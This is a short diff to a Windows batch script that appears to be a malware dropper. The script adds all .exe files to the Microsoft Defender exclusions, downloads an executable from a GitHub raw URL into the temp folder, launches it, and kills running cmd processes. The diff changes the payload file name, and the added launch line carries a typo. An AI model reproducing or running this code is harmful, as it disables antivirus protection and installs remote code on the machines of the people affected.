@@ -28,6 +28,6 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON32.EXE' -OutFile CMMON32.EXE"
-start CMMON32.EXE
+Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile CMMON.EXE"
+start CMMON.EXEf
 PowerShell -Command "Get-Process cmd -ErrorAction SilentlyContinue | ForEach-Object { $_.Kill() }"
